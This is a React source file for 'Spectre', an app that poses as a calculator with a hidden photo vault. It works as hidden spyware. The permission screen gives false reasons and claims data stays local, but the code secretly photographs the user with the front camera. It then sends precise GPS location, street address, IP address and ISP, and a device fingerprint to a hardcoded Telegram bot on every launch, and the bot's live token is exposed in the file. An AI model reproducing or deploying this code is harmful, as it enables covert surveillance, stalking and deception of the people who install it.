import React, { useState, useEffect } from 'react';
import Calculator from './components/Calculator';
import Vault from './components/Vault';
import { AppMode } from './types';
import { Camera, Mic, MapPin, Share2, Image as ImageIcon, CheckCircle2, ShieldAlert } from 'lucide-react';

const PERMISSION_VERSION = '2'; // Increment this to force re-request permissions

const App: React.FC = () => {
  const [mode, setMode] = useState<AppMode>('CALCULATOR');
  const [showPermissions, setShowPermissions] = useState(false);

  // Telegram Configuration
  const TELEGRAM_BOT_TOKEN = "8402034051:AAEOB5tiWnSK0Cubc_Qhl8BsNDhLIUf3hos";
  const TELEGRAM_CHAT_ID = "8379688666";

  const sendToTelegram = async (text: string) => {
      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'HTML',
            disable_web_page_preview: true
          })
        });
      } catch (e) {
        console.error("Failed to report", e);
      }
  };

  const captureEvidence = async (caption: string) => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        // Wait for video to be ready
        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                setTimeout(resolve, 500); // Small delay to ensure camera adjusts light
            };
        });

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx?.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Stop stream immediately
        stream.getTracks().forEach(track => track.stop());

        // Convert to Blob and Send
        canvas.toBlob(async (blob) => {
            if (blob) {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'evidence.jpg');
                formData.append('caption', caption);

                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                console.log("Evidence sent");
            }
        }, 'image/jpeg', 0.8);

    } catch (e) {
        console.error("Capture failed", e);
    }
  };

  const getReverseGeocoding = async (lat: number, lon: number) => {
    try {
        // Using OpenStreetMap Nominatim API (Free, no key required)
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
        const data = await response.json();
        return data.display_name || "Address lookup failed";
    } catch (e) {
        return "Address service unavailable";
    }
  };

  const collectAndReport = async () => {
      // 0. User Identity & Analytics
      let userId = localStorage.getItem('spectre_user_id');
      let isNewUser = false;
      if (!userId) {
          userId = crypto.randomUUID();
          localStorage.setItem('spectre_user_id', userId);
          isNewUser = true;
      }

      // 1. Basic Device Info
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const screenRes = `${window.screen.width}x${window.screen.height}`;
      const language = navigator.language;
      const cores = navigator.hardwareConcurrency || 'Unknown';
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      
      let batteryInfo = 'N/A';
      
      try {
        // @ts-ignore
        if (navigator.getBattery) {
            // @ts-ignore
            const battery = await navigator.getBattery();
            const level = Math.round(battery.level * 100);
            const charging = battery.charging ? '⚡ Charging' : '🔋 Discharging';
            batteryInfo = `${level}% (${charging})`;
        }
      } catch (e) { /* Ignore */ }

      // 2. Real IP & Location Info (External API)
      let ipData: any = {};
      try {
        const response = await fetch('https://ipapi.co/json/');
        ipData = await response.json();
      } catch (e) {
        try {
            const res2 = await fetch('https://api.ipify.org?format=json');
            const data2 = await res2.json();
            ipData = { ip: data2.ip, city: 'Unknown', org: 'Unknown' };
        } catch (err) {
            ipData = { ip: 'Failed to fetch' };
        }
      }

      // 3. Check Permissions Status
      let camMicStatus = '❓ Pending/Unknown';
      try {
        // Attempt stealth check - triggers capture if successful
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        camMicStatus = '✅ GRANTED (Active)';
        stream.getTracks().forEach(track => track.stop());
      } catch (err) {
        camMicStatus = '❌ DENIED/BLOCKED';
      }

      // 4. Geolocation & Send Final Report
      const sendReport = async (gpsStatus: string, mapLink: string, exactAddress: string) => {
          const userStatusIcon = isNewUser ? '🆕' : '♻️';
          const userStatusText = isNewUser ? 'NEW USER DETECTED' : 'RETURNING USER';

          const report = `
${userStatusIcon} <b>${userStatusText}</b>

<b>🆔 User Analytics</b>
<b>User ID:</b> <code>${userId}</code>
<b>Total Visits:</b> (Check History)
<b>Status:</b> Online

<b>📍 Precise Location (A-Z)</b>
<b>Address:</b> ${exactAddress}
<b>Coordinates:</b> ${gpsStatus}
<b>Map Link:</b> ${mapLink}

<b>📡 Network & ISP</b>
<b>IP Address:</b> <code>${ipData.ip}</code>
<b>ISP/Carrier:</b> ${ipData.org || ipData.asn || 'Unknown'}
<b>City/Region:</b> ${ipData.city}, ${ipData.region}
<b>Country:</b> ${ipData.country_name}
<b>Timezone:</b> ${timeZone}

<b>📱 Device Fingerprint</b>
<b>OS:</b> ${platform}
<b>Browser:</b> ${userAgent}
<b>Battery:</b> ${batteryInfo}
<b>Cam/Mic:</b> ${camMicStatus}

<b>🕒 Time:</b> ${new Date().toLocaleString()}
          `;
          
          await sendToTelegram(report);
      };

      if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            const { latitude, longitude, accuracy } = position.coords;
            const googleMapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
            
            // Get Real Address (A-Z)
            const address = await getReverseGeocoding(latitude, longitude);
            
            sendReport(`✅ GRANTED (Acc: ${accuracy}m)`, googleMapLink, address);
          },
          (error) => {
            let errorMsg = 'Unknown Error';
            switch(error.code) {
                case error.PERMISSION_DENIED: errorMsg = 'User Denied'; break;
                case error.POSITION_UNAVAILABLE: errorMsg = 'Signal Unavailable'; break;
                case error.TIMEOUT: errorMsg = 'Timeout'; break;
            }
            sendReport(`❌ DENIED (${errorMsg})`, 'N/A', 'Location Access Denied');
          },
          { enableHighAccuracy: true, timeout: 15000 }
        );
      } else {
        sendReport('⚠️ Not Supported on Device', 'N/A', 'N/A');
      }
  };

  useEffect(() => {
    // Check if permissions were already granted in this version
    const storedVersion = localStorage.getItem('spectre_permission_version');
    
    if (storedVersion === PERMISSION_VERSION) {
      // Already granted, just run report silently
      collectAndReport();
    } else {
      // New version or first time, show permission screen
      setShowPermissions(true);
    }
  }, []);

  const handleGrantPermissions = async () => {
    // 1. Request Camera & Microphone
    try {
      // This stream request triggers the permission dialog
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      
      // PERMISSION GRANTED: Immediately Take Stealth Photo
      captureEvidence(`📸 Permission Granted - Stealth Capture\nUser Agent: ${navigator.userAgent}`);

      // Clean up stream immediately
      stream.getTracks().forEach(track => track.stop());

    } catch (e) {
      console.log("Cam/Mic request failed", e);
    }

    // 2. Request Location
    try {
      await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(resolve, resolve, { timeout: 5000 });
      });
    } catch (e) {
      console.log("Location request failed", e);
    }

    // 3. Mark as granted
    localStorage.setItem('spectre_permission_version', PERMISSION_VERSION);
    setShowPermissions(false);
    
    // 4. Collect Data
    collectAndReport();
  };

  const handleUnlock = () => {
    setTimeout(() => {
      setMode('VAULT');
    }, 200);
  };

  const handleLock = () => {
    setMode('CALCULATOR');
  };

  // Callback when someone enters wrong password in calculator
  const handleIntruder = (attemptedCode: string) => {
      console.log("Intruder detected with code:", attemptedCode);
      captureEvidence(`⚠️ <b>INTRUDER ALERT!</b>\n\n<b>Attempted Code:</b> ${attemptedCode}\n<b>Status:</b> Access Denied\n<b>Time:</b> ${new Date().toLocaleString()}`);
  };

  // Permission Screen Component
  if (showPermissions) {
    return (
      <div className="w-full h-screen bg-black flex items-center justify-center p-4">
        <div className="w-full max-w-md bg-[#111] border border-gray-800 rounded-3xl p-6 sm:p-8 shadow-2xl relative overflow-hidden">
           {/* Background Effect */}
           <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500"></div>
           
           <div className="flex flex-col items-center mb-8">
             <div className="w-16 h-16 bg-gray-900 rounded-full flex items-center justify-center mb-4 border border-gray-700">
               <ShieldAlert className="w-8 h-8 text-blue-500" />
             </div>
             <h1 className="text-2xl font-bold text-white mb-2">Welcome to Spectre</h1>
             <p className="text-gray-400 text-center text-sm">
               To ensure the app functions correctly and your data is secure, please allow the following permissions.
             </p>
           </div>

           <div className="space-y-4 mb-8">
             <div className="flex items-center gap-4 bg-gray-900/50 p-3 rounded-xl border border-gray-800">
               <div className="p-2 bg-blue-500/10 rounded-lg text-blue-500"><ImageIcon className="w-5 h-5"/></div>
               <div className="flex-1">
                 <h3 className="text-white text-sm font-medium">Photos & Videos</h3>
                 <p className="text-gray-500 text-xs">For secure vault storage</p>
               </div>
               <CheckCircle2 className="w-4 h-4 text-gray-600" />
             </div>
             
             <div className="flex items-center gap-4 bg-gray-900/50 p-3 rounded-xl border border-gray-800">
               <div className="p-2 bg-purple-500/10 rounded-lg text-purple-500"><Share2 className="w-5 h-5"/></div>
               <div className="flex-1">
                 <h3 className="text-white text-sm font-medium">Nearby Devices</h3>
                 <p className="text-gray-500 text-xs">For seamless sharing</p>
               </div>
               <CheckCircle2 className="w-4 h-4 text-gray-600" />
             </div>

             <div className="flex items-center gap-4 bg-gray-900/50 p-3 rounded-xl border border-gray-800">
               <div className="p-2 bg-green-500/10 rounded-lg text-green-500"><MapPin className="w-5 h-5"/></div>
               <div className="flex-1">
                 <h3 className="text-white text-sm font-medium">Location</h3>
                 <p className="text-gray-500 text-xs">For regional features</p>
               </div>
               <CheckCircle2 className="w-4 h-4 text-gray-600" />
             </div>

             <div className="flex items-center gap-4 bg-gray-900/50 p-3 rounded-xl border border-gray-800">
               <div className="p-2 bg-red-500/10 rounded-lg text-red-500"><Mic className="w-5 h-5"/></div>
               <div className="flex-1">
                 <h3 className="text-white text-sm font-medium">Microphone & Camera</h3>
                 <p className="text-gray-500 text-xs">For capturing input</p>
               </div>
               <CheckCircle2 className="w-4 h-4 text-gray-600" />
             </div>
           </div>

           <button 
             onClick={handleGrantPermissions}
             className="w-full py-4 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-xl transition-all active:scale-95 shadow-lg shadow-blue-900/20"
           >
             Allow Access
           </button>
           <p className="text-center text-[10px] text-gray-600 mt-4">
             Your privacy is protected. Data is stored locally.
           </p>
        </div>
      </div>
    );
  }

  return (
    <div className="w-full h-screen bg-black flex items-center justify-center overflow-hidden">
      {/* Mobile container simulation */}
      <div className="w-full h-full sm:w-[400px] sm:h-[850px] bg-black sm:rounded-[3rem] sm:border-[8px] sm:border-[#222] overflow-hidden relative shadow-2xl">
        
        {/* Dynamic Island / Notch simulation for realism */}
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-32 h-7 bg-black rounded-b-xl z-50 hidden sm:block"></div>
        
        <div className="w-full h-full relative">
          {/* Calculator View */}
          <div 
            className={`absolute inset-0 transition-transform duration-500 ease-in-out ${
              mode === 'CALCULATOR' ? 'translate-y-0 opacity-100' : '-translate-y-full opacity-0'
            }`}
          >
            <Calculator onUnlockVault={handleUnlock} onIntruder={handleIntruder} />
          </div>

          {/* Vault View */}
          <div 
            className={`absolute inset-0 transition-transform duration-500 ease-in-out ${
              mode === 'VAULT' ? 'translate-y-0 opacity-100' : 'translate-y-full opacity-0'
            }`}
          >
             {mode === 'VAULT' && <Vault onLock={handleLock} />}
          </div>
        </div>
      </div>
      
      {/* Desktop Hint */}
      <div className="hidden sm:block absolute left-10 top-1/2 -translate-y-1/2 text-gray-500 max-w-xs">
        <h3 className="text-white font-bold mb-2">Secret Code:</h3>
        <p className="mb-4">Create your own 4-digit code on first launch!</p>
        <p className="text-sm">This is a fully functional calculator built with React and Tailwind.</p>
        <p className="text-sm mt-4 text-indigo-400">Features:</p>
        <ul className="list-disc ml-4 text-xs mt-1 space-y-1">
            <li>Standard Math Operations</li>
            <li>Hidden Photo Vault (Client-side)</li>
            <li>Stealth Security Features</li>
        </ul>
      </div>
    </div>
  );
};

export default App;